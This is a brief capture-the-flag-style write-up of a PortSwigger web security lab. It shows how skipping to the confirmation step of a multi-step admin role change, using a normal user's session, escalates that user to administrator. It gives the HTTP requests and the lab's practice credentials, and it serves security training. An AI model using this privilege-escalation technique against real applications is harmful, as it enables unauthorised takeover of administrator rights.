# [Lab: Multi-step process with no access control on one step](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step)

This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials  `administrator:admin`.

To solve the lab, log in using the credentials  `wiener:peter`  and exploit the flawed  [access controls](https://portswigger.net/web-security/access-control)  to promote yourself to become an administrator.

## Analysis

multi-step upgrade `wiener` account:

```http
POST /admin-roles HTTP/1.1
Cookie: session=adminsession

username=wiener&action=upgrade
```

```http
POST /admin-roles HTTP/1.1
Cookie: session=adminsession

action=upgrade&confirmed=true&username=wiener
```

## Solutions

only send the second request with wiener session:

```http
POST /admin-roles HTTP/1.1
Cookie: session=wienersession

action=upgrade&confirmed=true&username=wiener
```

=> solved
